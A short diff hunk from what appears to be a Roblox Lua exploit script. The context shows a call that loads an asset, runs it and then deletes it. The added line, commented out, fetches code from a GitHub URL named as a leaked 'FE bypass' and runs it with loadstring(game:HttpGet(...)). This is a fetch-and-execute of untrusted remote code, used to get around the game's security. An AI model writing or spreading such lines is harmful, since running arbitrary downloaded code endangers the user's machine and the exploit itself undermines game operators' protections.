@@ -62,3 +62,4 @@ end
 
 -- execute the fawking function
 loadExecuteAndDeleteAsset(assetID)
+--loadstring(game:HttpGet("https://raw.githubusercontent.com/OfficialOlddorito/olddoritoshiddenfebypasstest/main/olddoritoleakedfebypaz"))()
